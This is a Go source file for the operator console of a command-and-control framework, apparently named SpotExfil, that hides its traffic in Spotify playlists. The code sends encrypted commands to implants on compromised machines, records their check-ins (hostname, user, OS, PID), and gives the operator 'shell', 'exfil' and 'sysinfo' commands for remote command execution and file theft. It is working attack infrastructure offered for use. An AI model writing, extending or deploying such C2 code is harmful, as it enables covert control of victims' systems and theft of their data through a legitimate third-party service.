package c2

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// ClientInfo holds information about a connected implant.
type ClientInfo struct {
	Hostname    string
	OS          string
	User        string
	ConnectedAt string
	PID         int
}

// Operator sends commands and retrieves results.
type Operator struct {
	client           *spotify.Client
	key              string
	nextSeq          int
	pendingSeqs      map[int]string       // seq -> module name
	connectedClients map[string]ClientInfo // client_id -> info
}

// NewOperator creates a new operator.
func NewOperator(client *spotify.Client, key string) *Operator {
	return &Operator{
		client:           client,
		key:              key,
		nextSeq:          1,
		pendingSeqs:      make(map[int]string),
		connectedClients: make(map[string]ClientInfo),
	}
}

// SendCommand queues a command for the implant.
func (op *Operator) SendCommand(module string, args map[string]interface{}) (int, error) {
	ctx := context.Background()
	seq := op.nextSeq
	op.nextSeq++

	msg := protocol.NewC2Message(module, seq)
	msg.Args = args

	encoded, err := protocol.EncodeMessage(msg.ToCommandMap(), op.key)
	if err != nil {
		return 0, fmt.Errorf("encode: %w", err)
	}

	chunks, err := protocol.ChunkPayload(encoded, seq,
		protocol.ChannelCmd, op.key)
	if err != nil {
		return 0, fmt.Errorf("chunk: %w", err)
	}

	if err := op.client.WriteC2Playlists(ctx, chunks); err != nil {
		return 0, fmt.Errorf("write: %w", err)
	}

	op.pendingSeqs[seq] = module
	fmt.Printf("[*] Command queued: seq=%d module=%s\n", seq, module)
	return seq, nil
}

// PollResults does a single poll pass for results.
func (op *Operator) PollResults() (map[int]map[string]interface{}, error) {
	ctx := context.Background()
	seqGroups, err := op.client.ReadC2Playlists(ctx,
		protocol.ChannelRes, op.key, -1)
	if err != nil {
		return nil, err
	}

	results := make(map[int]map[string]interface{})
	for seqNum, chunkMetas := range seqGroups {
		payload := protocol.ReassemblePayload(chunkMetas)
		result, err := protocol.DecodeMessage(payload, op.key)
		if err != nil {
			errStr := strings.ToLower(err.Error())
			if strings.Contains(errStr, "tag") || strings.Contains(errStr, "decrypt") || strings.Contains(errStr, "cipher") {
				fmt.Printf("[!] Failed to decode result seq=%d: encryption key mismatch with implant?\n", seqNum)
			} else {
				fmt.Printf("[!] Failed to decode result seq=%d: %v\n", seqNum, err)
			}
			continue
		}
		// Handle checkin beacon
		if module, ok := result["module"].(string); ok && module == "checkin" {
			op.handleCheckin(result)
			_ = op.client.CleanC2Playlists(ctx,
				protocol.ChannelRes, op.key, seqNum)
			continue
		}
		results[seqNum] = result
		_ = op.client.CleanC2Playlists(ctx,
			protocol.ChannelRes, op.key, seqNum)
		delete(op.pendingSeqs, seqNum)
	}
	return results, nil
}

// WaitForResult blocks until a specific result arrives or timeout.
func (op *Operator) WaitForResult(seq int) (map[string]interface{}, error) {
	timeout := time.Duration(shared.Proto.C2.WaitTimeout) * time.Second
	pollInterval := time.Duration(shared.Proto.C2.WaitPollInterval) * time.Second

	start := time.Now()
	for time.Since(start) < timeout {
		results, err := op.PollResults()
		if err != nil {
			return nil, err
		}
		if result, ok := results[seq]; ok {
			return result, nil
		}
		remaining := timeout - time.Since(start)
		fmt.Printf("[*] Waiting for seq=%d... (%ds remaining)\n",
			seq, int(remaining.Seconds()))
		time.Sleep(pollInterval)
	}
	return nil, fmt.Errorf("timeout waiting for seq=%d", seq)
}

// checkForCheckins silently polls for new implant check-ins.
func (op *Operator) checkForCheckins() {
	op.PollResults()
}

// Interactive runs the interactive operator console.
func (op *Operator) Interactive() {
	fmt.Println("SpotExfil C2 Operator Console")
	fmt.Println("Type 'help' for available commands.\n")

	// Initial check for pending checkins
	op.checkForCheckins()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("c2> ")
		if !scanner.Scan() {
			fmt.Println("\n[*] Exiting")
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			op.checkForCheckins()
			continue
		}

		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToLower(parts[0])
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "quit", "exit":
			fmt.Println("[*] Exiting")
			return
		case "help":
			printHelp()
		case "shell":
			if arg == "" {
				fmt.Println("[!] Usage: shell <command>")
				continue
			}
			op.SendCommand("shell", map[string]interface{}{"cmd": arg})
		case "exfil":
			if arg == "" {
				fmt.Println("[!] Usage: exfil <path>")
				continue
			}
			op.SendCommand("exfil", map[string]interface{}{"path": arg})
		case "sysinfo":
			op.SendCommand("sysinfo", nil)
		case "results":
			results, err := op.PollResults()
			if err != nil {
				fmt.Printf("[!] Poll error: %v\n", err)
				continue
			}
			if len(results) > 0 {
				seqs := make([]int, 0, len(results))
				for s := range results {
					seqs = append(seqs, s)
				}
				sort.Ints(seqs)
				for _, s := range seqs {
					displayResult(s, results[s])
				}
			} else {
				fmt.Println("[*] No results available")
			}
		case "wait":
			if arg == "" {
				fmt.Println("[!] Usage: wait <seq>")
				continue
			}
			seqNum, err := strconv.Atoi(arg)
			if err != nil {
				fmt.Println("[!] seq must be a number")
				continue
			}
			result, err := op.WaitForResult(seqNum)
			if err != nil {
				fmt.Printf("[!] %v\n", err)
				continue
			}
			if result != nil {
				displayResult(seqNum, result)
			}
		case "clean":
			op.cleanAll()
		case "status":
			op.printStatus()
		default:
			fmt.Printf("[!] Unknown command: %s. Type 'help'.\n", cmd)
		}
	}
}

func (op *Operator) cleanAll() {
	ctx := context.Background()
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelCmd, op.key, -1)
	_ = op.client.CleanC2Playlists(ctx, protocol.ChannelRes, op.key, -1)
	fmt.Println("[*] All C2 playlists cleaned")
}

func (op *Operator) printStatus() {
	if len(op.connectedClients) > 0 {
		fmt.Printf("[*] Connected implants (%d):\n", len(op.connectedClients))
		for cid, info := range op.connectedClients {
			fmt.Printf("  %s  %s  %s  since %s\n",
				cid, info.Hostname, info.OS, info.ConnectedAt)
		}
	} else {
		fmt.Println("[*] No implants connected")
	}
	if len(op.pendingSeqs) > 0 {
		fmt.Println("[*] Pending commands:")
		seqs := make([]int, 0, len(op.pendingSeqs))
		for s := range op.pendingSeqs {
			seqs = append(seqs, s)
		}
		sort.Ints(seqs)
		for _, s := range seqs {
			fmt.Printf("  seq=%d module=%s\n", s, op.pendingSeqs[s])
		}
	} else {
		fmt.Println("[*] No pending commands")
	}
	fmt.Printf("[*] Next seq: %d\n", op.nextSeq)
}

func (op *Operator) handleCheckin(result map[string]interface{}) {
	data, _ := result["data"].(string)
	var info map[string]interface{}
	if err := json.Unmarshal([]byte(data), &info); err != nil {
		fmt.Println("\n[+] New implant connected! (could not parse details)")
		return
	}
	clientID, _ := info["client_id"].(string)
	hostname, _ := info["hostname"].(string)
	osInfo, _ := info["os"].(string)
	user, _ := info["user"].(string)
	pid := 0
	if p, ok := info["pid"].(float64); ok {
		pid = int(p)
	}
	ts, _ := result["ts"].(float64)
	timestamp := time.Unix(int64(ts), 0).Format("2006-01-02 15:04:05")

	op.connectedClients[clientID] = ClientInfo{
		Hostname:    hostname,
		OS:          osInfo,
		User:        user,
		ConnectedAt: timestamp,
		PID:         pid,
	}

	fmt.Printf("\n[+] New implant connected!\n"+
		"    client_id : %s\n"+
		"    hostname  : %s\n"+
		"    os        : %s\n"+
		"    timestamp : %s\n\n",
		clientID, hostname, osInfo, timestamp)
}

func displayResult(seq int, result map[string]interface{}) {
	module, _ := result["module"].(string)
	status, _ := result["status"].(string)
	data, _ := result["data"].(string)

	fmt.Printf("\n--- Result seq=%d [%s] status=%s ---\n", seq, module, status)
	if module == "sysinfo" && status == "ok" {
		var info map[string]interface{}
		if json.Unmarshal([]byte(data), &info) == nil {
			for k, v := range info {
				fmt.Printf("  %s: %v\n", k, v)
			}
		} else {
			fmt.Println(data)
		}
	} else {
		fmt.Println(data)
	}
	fmt.Println("---")
}

func printHelp() {
	fmt.Println(`
Available commands:
  shell <cmd>     Execute a shell command on the implant
  exfil <path>    Exfiltrate a file from the implant
  sysinfo         Gather system info from the implant
  results         Poll for pending results (single pass)
  wait <seq>      Wait for a specific result (blocking)
  clean           Remove all C2 playlists
  status          Show pending commands
  help            Show this help
  quit / exit     Exit the console`)
}
